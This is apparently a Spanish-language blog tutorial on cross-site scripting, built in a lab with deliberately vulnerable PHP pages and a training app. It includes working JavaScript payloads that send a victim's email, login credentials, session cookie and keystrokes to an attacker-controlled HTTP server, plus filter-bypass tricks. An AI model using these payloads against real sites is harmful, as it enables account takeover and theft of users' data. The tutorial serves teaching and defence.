---
title: Cross-Site Scripting
tags:
  - "XSS"
categories:
  - "Explicación"
  - "XSS"
image:
  path: /assets/img/xss/cross-site-scripting.png
---

Una de las vulnerabilidades más conocidas y más utilizadas son los XSS o Cross-Site Scripting, una vulnerabilidad que permite inyectar scripts malintencionados pudiendo ejecutar código en el navegador de los usuarios sin la autorización de estos. En este post, abordaremos este vector de ataque, cómo funciona, los tipos que existen etc.

----

## ¿Que es Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar scripts maliciosos en páginas vistas por otros usuarios. Esta inyección puede llevar a la ejecución de código en el navegador de la víctima sin su consentimiento.

Esta vulnerabilidad ocurre cuando una aplicación web no valida adecuadamente los datos de entrada proporcionada por el usuario, pudiendo hasta robar información sensible como nombres de usuario, contraseñas u otros datos confidenciales.

## Tipos de XSS

En función de la situación, el XSS puede dividirse en tres categorias:  

1. **Reflected XSS**: El Reflected XSS se produce cuando el código es `reflejado` en la respuesta de la aplicación web, normalmente a través de una URL o formulario. El script se ejecuta inmediatamente cuando el usuario interactúa con la página.

2. **Stored XSS**: El Stored XSS es ocasionado cuando el código se almacena `permanentemente` en el servidor, y se ejecuta cada vez que un usuario accede a la página afectada.

3. **DOM XSS**: En el `DOM` XSS el script manipula el **D**ocument **O**bject **M**odel de la página directamente en el lado del cliente, sin interactuar con el servidor.

### Reflected XSS

  

El XSS reflejado es un tipo de ataque de Cross-Site Scripting en el atacante añade codigo no autorizado en formularios, URLs, encabezados HTTP entre otros medios. Este código es procesado por el servidor y luego `reflejado` en la página web, lo que provoca que el navegador de la víctima ejecute ese código.

  

![img](/assets/img/xss/xss_r.png)

  

Para que quede más claro simularemos un entorno en el que este presente un Reflected XSS.

Añadiremos un archivo que nos pida un texto y luego, utilizando `PHP` mostrará ese texto por pantalla.

```php
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reflected_XSS</title>
</head>
<body>
    <form name="XSS" method="GET">
        <p>Escribe aquí:</p>
            <input type="text" name="name">
            <input type="submit" value="Submit">
    </form>
</body>
</html>
<?php

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    echo $_GET[ 'name' ];
}

?>
```

Ahora al acceder podemos ver nuestro formulario.

![img](/assets/img/xss/xssr_1.png)

![img](/assets/img/xss/xssr_2.png)


Para ilustrar la vulnerabilidad del `Reflected XSS` ingresaremos un script en `JavaScript`, y revisarermos si ese script se esta ejecutando en el navegador.

![img](/assets/img/xss/xssr_3.png)

Como podemos observar vemos que al enviar la petición nos salta un pop-up con el texto `XSS_R`.

![img](/assets/img/xss/xssr_4.png)

Y al ver que es lo que nos muestra la página, observamos que solo muestra el texto `test`.

![img](/assets/img/xss/xssr_5.png)

Esto es debido a que el texto que se encuentra dentro de las etiquetas `<script>...</script>` no está siendo interpretado como texto `HTML` sino como código `JavaScript`. En este caso ejecuta la función `alert()` que muestra un cuadro de diálogo con el mensaje que nosotros ingresamos.

![img](/assets/img/xss/xssr_6.png)

De esta manera un usuario malintencionado podría obtener acceso a información sensible del usuario, como las cookies de sesión, tokens de autenticación entre otros datos. 

En este ejemplo supongamos que le enviamos el siguiente enlace al usuario victima.

```text
http://192.168.6.236/XSS_R/?name=test<script src="http://192.168.6.5:8000/prompt.js"></script>
```

Mientras que en el otro lado tendremos corriendo un servidor `HTTP` el cual contiene el siguiente archivo `JavaScript` que se ejecutará en el navegador del usuario.

```js
// Guarda en la variable 'email' el input del usuario
var email = prompt("Introducir correo electrónico para continuar");

// Guarda en la variable 'req' una nueva instancia del objeto XMLHttpRequest, que permite realizar peticiones HTTP
var req = new XMLHttpRequest();

// Realiza una petición via GET al servidor HTTP concantenando el input del usuario
req.open("GET","http://192.168.6.5:8000/?email=" + email);

// Envía la solicitud al servidor
req.send()
```

![img](/assets/img/xss/xssr_7.png)


El usuario al pinchar en el enlace le aparecerá una ventana donde se le pedirá el correo electrónico.

![img](/assets/img/xss/xssr_8.png)

Al enviar el correo, el usuario sin percatarse ha enviado su correo electrónico al atacante.

![img](/assets/img/xss/xssr_9.png)

Este ejemplo es bastante simple y podría escalarse a algo más complejo, pero ya podemos hacernos una idea de lo peligroso que es este tipo de ataque de Cross-Site Scripting.

Cambiaremos el codigo `PHP` por el siguiente.

```php
<?php

if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {

    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    echo "<pre>Hello {$name}</pre>";
}

?>
```
En este código la etiqueta `<script>` no estará permitido.

Si volvemos a la pagina y tratamos de añadir la etiqueta `<script>` no nos funcionará.

![img](/assets/img/xss/xssr_10.png)

![img](/assets/img/xss/xssr_11.png)

A parte de utilizar la etiqueta `<script>` se podrían utilizar otras como por ejemplo la etiqueta `<img>`.

En este caso se le esta indicando que cargue una imagen y en caso de que de error, ejecute la función `alert()`.

![img](/assets/img/xss/xssr_12.png)


### Stored XSS

El `Stored XSS` es el más peligroso de los tres tipos de ataques de Cross-Site Scripting, ya que permite al atacante `almacenar` un script malintencionado en el servidor.

El script podría guardarse en registros de comentarios, publicaciones, campos de perfil, entre otros medios. Cada vez que un usuario acceda al sitio donde se almacena el script, lo ejecutará sin darse cuenta.

![img](/assets/img/xss/xss_s.png)

Para poder comprender cómo funciona el vector de ataque `Stored XSS`, descargaremos un repositorio de [GitHub](https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2021-apps/a3/gossip-world) que contempla este tipo de vulnerabilidad,  siguiendo estos pasos.
  
```bash
git clone https://github.com/globocom/secDevLabs
cd secDevLabs/owasp-top10-2021-apps/a3/gossip-world
apt install make docker-compose curl && make install
```

![img](/assets/img/xss/xsss_1.png)

Con los pasos ya realizados, deberíamos poder acceder a la página.

![img](/assets/img/xss/xsss_2.png)

Como no tenemos ningún usuario creado, crearemos dos para este caso `pringles` y `test`.

![img](/assets/img/xss/xsss_3.png)

![img](/assets/img/xss/xsss_4.png)

Accedemos a la página.

![img](/assets/img/xss/xsss_5.png)

![img](/assets/img/xss/xsss_6.png)

En el apartado `New gossip` tenemos la opción de crear una nueva publicación.

![img](/assets/img/xss/xsss_7.png)

![img](/assets/img/xss/xsss_8.png)

Al subir la publicación podemos observar que nos aparece en el inicio de la página.

![img](/assets/img/xss/xsss_9.png)

![img](/assets/img/xss/xsss_10.png)

Crearemos otra publicación, pero ahora añadiendo etiquetas `<script></script>` para comprobar si se acontece un `XSS`.

![img](/assets/img/xss/xsss_11.png)


Al acceder a la publicación podemos comprobar que si se está aconteciendo un `XSS`.

![img](/assets/img/xss/xsss_12.png)

![img](/assets/img/xss/xsss_13.png)

Ahora creamos otra publicación, pero ahora cada vez que se acceda a esta, el usuario será redirigido a nuestro servidor `HTTP`.

![img](/assets/img/xss/xsss_14.png)

Al acceder a la publicación y ser redirigidos a la nueva URL, podría parecer que simplemente nos ha enviado de nuevo al panel de login, pero no es así. Si nos fijamos bien, podemos observar que la URL apunta a nuestro servidor HTTP. Lo que hemos hecho es crear una copia del panel de login para que, al acceder a la publicación, el usuario piense que su sesión ha expirado.

![img](/assets/img/xss/xsss_15.png)

![img](/assets/img/xss/xsss_16.png)

![img](/assets/img/xss/xsss_17.png)

Modificamos el formulario para que no realice una petición por POST y añadimos un código en JavaScript para que se ejecute cuando enviemos el formulario.

```bash
            <form id="login">
                <p class="text-danger"></p>
                <center><input type="text" class="input-login" id= "username" aria-describedby="sizing-addon1"  maxlength="100" placeholder="Username"></center>
                <br>
                <center><input type="password" class="input-login" id= "password" aria-describedby="sizing-addon1"  maxlength="200" placeholder="Password"></center>
                <br>
               <center><a href="/register">Create a new free account!</a></p></center>
                <button type="submit" class="btn full-width" style="width: 100%; ">GO!</button>
            </form>
        </div>
    </div>
   </div>
   </br>
   </br>
<script>
    // La función se activa al enviar el formulario
    document.getElementById('login').addEventListener('submit', function(event) {
        event.preventDefault(); // Evita que el formulario se envíe de forma predeterminada

        // Los valores enviados del formulario son guardados en variables
        const nombre = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Crea la URL con las variables creadas
        const url = `http://192.168.6.5:8000/?name=${encodeURIComponent(nombre)}&password=${encodeURIComponent(password)}`;

        // Realiza la solicitud por el método GET
        fetch(url, {
            method: 'GET'
        })

        // Redirige a la URL
        window.location.href = "http://192.168.6.238:10007/gossip";
    });
</scipt>
```

Cuando el usuario envíe los datos de su sesión al falso panel de login, sin darse cuenta estará enviando esos datos a nuestro servidor HTTP.

![img](/assets/img/xss/xsss_18.png)

![img](/assets/img/xss/xsss_19.png)

### DOM XSS

A diferencia de los otros tipos de ataque de Cross-Site Scripting, en el `DOM XSS` la solicitud no es enviada al servidor, sino que es directamente interpretada por el navegador del usuario, aprovechando la interacción del código `JavaScript` con él (DOM) **D**ocument **O**bject **M**odule para inyeceta y ejecutar código no deseado en este.

![img](/assets/img/xss/xss_d.png)

Para este ejemplo simularemos un entorno donde este presente el DOM XSS.

En este caso, en el servidor, añadiremos el siguiente archivo HTML con un código `JavaScript` que modifica el `DOM` para generar dinámicamente opciones en un elemento `<select>`.

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    </style>
</head>
<body>
<form name="XSS" method="GET">
	<select name="color">
		<script>
			if (document.location.href.indexOf("color=") >= 0) {
				var lang = document.location.href.substring(document.location.href.indexOf("color=")+6);
				document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
				document.write("<option value='' disabled='disabled'>----</option>");
			}

			document.write("<option value='Red'>Red</option>");
			document.write("<option value='Black'>Black</option>");
			document.write("<option value='Blue'>Blue</option>");
			document.write("<option value='Green'>Green</option>");
		</script>
	</select>
	<input type="submit" value="Select" />
</form>
</body>
</html>
```

En el código PHP, denegaremos todas las peticiones que no contengan las siguientes opciones. Es decir, si el servidor recibe una petición con el valor `?color=Red<img src=x onerror="alert(123)">`, será redirigido a la URL `?color=Red`.

```php
if ( array_key_exists( "color", $_GET ) && !is_null ($_GET[ 'color' ]) ) {

    switch ($_GET['color']) {
        case "Red":
        case "Green":
        case "Blue":
        case "Black":
            break;
        default:
            header ("location: ?color=Red");
            exit;
    }
}
?>
```

![img](/assets/img/xss/xssd_1.png)

Si probamos con añadir la etiqueta `<img>` o cualquier otra para tratar de acontecer un `XSS` nos redirige a la URL `?color=Red`.

![img](/assets/img/xss/xssd_2.png)

![img](/assets/img/xss/xssd_3.png)

En este caso vemos que la petición nos redirige a `?color=Red` devido a que el servidor recibe la petición y el codigo `PHP` es ejecutado.

Algo que se podría hacer es utilizar es el signo `#` hash, que se conoce como identificador de fragmento (fragment identifier), esta parte de la `URL` es procesada exclusivamente por el navegador web del cliente.

![img](/assets/img/xss/xssd_4.png)

Al utilizar ahora el hash `#` podemos observar que ahora no nos redirige a `?color=Red` debido a que todo lo que va después del signo no es enviado al código `PHP`, por lo que el servidor recibe únicamente la petición que si que es correcta.

![img](/assets/img/xss/xssd_5.png)

El problema está en que no nos está interpretando la etiqueta `<img>`, si observamos vemos que se encuentra dentro de la etiqueta `<select>`, y esa etiqueta solo permite etiquetas `<option>` y `<optgroup>`, por lo que en la URL lo que tendremos que hacer es cerrar dicha etiqueta.

![img](/assets/img/xss/xssd_6.png)

![img](/assets/img/xss/xssd_7.png)


## Técnicas a Través de XSS

Hemos revisado los distintos tipos de XSS, pero cabe destacar que mediante
un ataque XSS, se pueden facilitar diversas amenazas adicionales, como
el robo de cookies ( `cookie hijacking` ) y la captura de pulsaciones de
teclas ( `keylogging` ), entre otros métodos. En este caso, nos centraremos
específicamente en estos dos ejemplos.

## ¿Qué es el Cookie Hijacking?
  
El Cookie Hijacking es un tipo de ataque en el cual un atacante secuestra las cookies de sesión
de un usuario para acceder como este en un servicio web sin la autorización permitida. Las 
cookies son pequeños fragmentos de datos que los sitios web almacenan 
en el navegador del usuario para mantener su sesión activa, y contienen 
información esencial para la autenticación, como identificadores de 
sesión.


### Cookie Hijacking en XSS

En este ejemplo, al igual que en el caso del `keylogging`, utilizaremos el repositorio de Github del apartado de [Stored XSS](#stored-xss) para poder explicar
y comprender como funcionan este tipos de ataque.

Para ver la cookie de sesión, habría que acceder a ella utilizando la propiedad `cookie` del objeto `document` tal que así: `document.cookie`.

![img](/assets/img/xss/xssc_1.png)

En este caso no se nos muestra debido a que el `HttpOnly` está habilitado, un atributo del navegador creado para impedir que por el lado del cliente se accedan a las cookies.

![img](/assets/img/xss/xssc_2.png)

Para este ejemplo deshabilitaremos el atributo `HttpOnly` para poder robar la cookie de sesión.

![img](/assets/img/xss/xssc_3.png)

Crearemos un archivo en el cual, el usuario tras acceder, enviará por el método GET su `session cookie` a nuestro servidor HTTP.

```javascript
var req = new XMLHttpRequest();

req.open("GET","http://192.168.6.5:8000/?cookie=" + document.cookie);

req.send()
```

En la publicación que creamos, se realizará una petición al archivo JavaScript de nuestro servidor HTTP.

![img](/assets/img/xss/xssc_4.png)

Al acceder a la publicación como el usuario `test`, observamos que en el servidor HTTP nos aparece la cookie del usuario.

![img](/assets/img/xss/xssc_5.png)

![img](/assets/img/xss/xssc_6.png)

Como el usuario `pringles`, cambiamos nuestra cookie por la cookie del usuario y creamos una publicación, veremos que el propietario de esta es el usuario `test`.

![img](/assets/img/xss/xssc_7.png)

![img](/assets/img/xss/xssc_8.png)

![img](/assets/img/xss/xssc_9.png)

## ¿Qué es el Keylogging?

El keylogging o registrador de teclas es una técnica de captura de las teclas que un usuario presiona en su teclado sin su conocimiento. Se utiliza para monitorear y registrar todo lo que una persona escribe, desde mensajes en redes sociales hasta datos más sensibles, como correos electrónicos o contraseñas.

### Keylogging en XSS

Para este ejemplo crearemos una publicación, la cual contendra el siguiente codigo.

```javascript
// Declaración de una variable 'k' para almacenar las teclas presionadas.
var k = "";

// Asigna una función al evento 'onkeypress' del 
// documento (cuando se presiona una tecla en el teclado).
document.onkeypress = function(e) {
    // Verifica la compatibilidad de eventos y
    // asigna el evento a 'e' si está
    // disponible. (Para que funcione en todos los navegadores)
    e = e || window.event;

    // Concatena la tecla presionada al valor existente de 'k'.
    k += e.key;

    // Crea una nueva instancia de la imagen 'i'.
    var i = new Image();

    // Establece la fuente de la imagen ('src') para enviar
    // una solicitud a la dirección URL especificada y
    // agrega el valor de 'k' como parte de la URL.
    i.src = "http://192.168.6.5:8000/" + k;
};
```

![img](/assets/img/xss/xssk_1.png)

Si accedemos a la publicación, con el servidor HTTP activo podemos observar que cada tecla que se presiona es enviado al servidor.

![img](/assets/img/xss/xssk_2.png)


## Conclusión

Cabe recalcar que no solamente existen estas etiquetas ni estos métodos para poder detectar o explotar una vulnerabilidad XSS.

Por tanto, es crucial conocer y entender cómo funcionan estos tipos de ataques para poder prevenir futuras catástrofes. Es fundamental aplicar medidas de seguridad, como la sanitización y el escape de datos, además de implementar políticas de seguridad como CSP (Content Security Policy) para mitigar posibles ataques XSS.

